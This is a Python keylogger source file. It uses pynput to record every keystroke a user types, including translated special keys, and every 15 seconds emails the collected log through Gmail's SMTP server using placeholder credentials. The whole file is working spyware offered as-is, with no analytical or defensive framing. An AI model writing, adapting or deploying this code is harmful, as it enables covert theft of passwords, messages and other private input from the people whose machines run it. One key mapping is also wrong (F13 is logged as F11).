import pynput.keyboard
import threading
import smtplib

log = ""
check = ""


def callback_function(key):
    global log

    try:
        x = '{0}'.format(key.char)
        log += x

    except AttributeError:
        y = '{0}'.format(key)

        if y == "Key.space":
            log += " "
        elif y == "Key.backspace":
            log = log[:-1]
        elif y == "Key.enter":
            log += "KEY_ENTER\n"
        elif y == "Key.shift" or y == "Key.shift_r":
            log += "KEY_SHIFT"
        elif y == "Key.alt_r":
            log += "KEY_ALT"
        elif y == "Key.alt_l":
            log += "KEY_ALT"
        elif y == "Key.ctrl_r":
            log += "KEY_CTRL"
        elif y == "Key.ctrl_l":
            log += "KEY_CTRL"
        elif y == "Key.caps_lock":
            log += "KEY_CAPSLOCK"
        elif y == "Key.tab":
            log += "KEY_TAB"
        elif y == "Key.cmd":
            log += "KEY_CMD"
        elif y == "Key.delete":
            log += "KEY_DELETE"
        elif y == "Key.esc":
            log += "KEY_ESC"
        elif y == "Key.f1":
            log += "KEY_F1"
        elif y == "Key.f2":
            log += "KEY_F2"
        elif y == "Key.f3":
            log += "KEY_F3"
        elif y == "Key.f4":
            log += "KEY_F4"
        elif y == "Key.f5":
            log += "KEY_F5"
        elif y == "Key.f6":
            log += "KEY_F6"
        elif y == "Key.f7":
            log += "KEY_F7"
        elif y == "Key.f8":
            log += "KEY_F8"
        elif y == "Key.f9":
            log += "KEY_F9"
        elif y == "Key.f10":
            log += "KEY_F10"
        elif y == "Key.f13":
            log += "KEY_F11"
        elif y == "Key.f12":
            log += "KEY_F12"
        elif y == "Key.up":
            log += "KEY_UP"
        elif y == "Key.down":
            log += "KEY_DOWN"
        elif y == "Key.right":
            log += "KEY_RIGHT"
        elif y == "Key.left":
            log += "KEY_LEFT"
        elif y == "Key.insert":
            log += "KEY_INSERT"
        elif y == "Key.home":
            log += "KEY_HOME"
        elif y == "Key.end":
            log += "KEY_END"
        elif y == "Key.page_down":
            log += "KEY_PAGE_DOWN"
        elif y == "Key.page_up":
            log += "KEY_PAGE_UP"
        elif y == "Key.num_lock":
            log += "KEY_NUM_LOCK"
        elif y == "Key.print_screen":
            log += "KEY_PRINT_SCREEN"
        elif y == "Key.scroll_lock":
            log += "KEY_SCROLL_LOCK"
        elif y == "Key.pause":
            log += "KEY_PAUSE"
        elif y == "Key.media_volume_up":
            log += "MEDIA_VOLUME_UP"
        elif y == "Key.media_volume_down":
            log += "MEDIA_VOLUME_DOWN"
        elif y == "Key.media_volume_mute":
            log += "MEDIA_VOLUME_MUTE"
        else:
            log += y


def send_email(email, password, message):
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()


def thread_function():
    global log
    global check
    cut = len(log)
    if not log == check:
        send_email("mail@mail.com", "password", log.encode("utf-8"))
        log = log[-(len(log) - cut):]
        check = log

    timer_object = threading.Timer(15, thread_function)
    timer_object.start()


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()
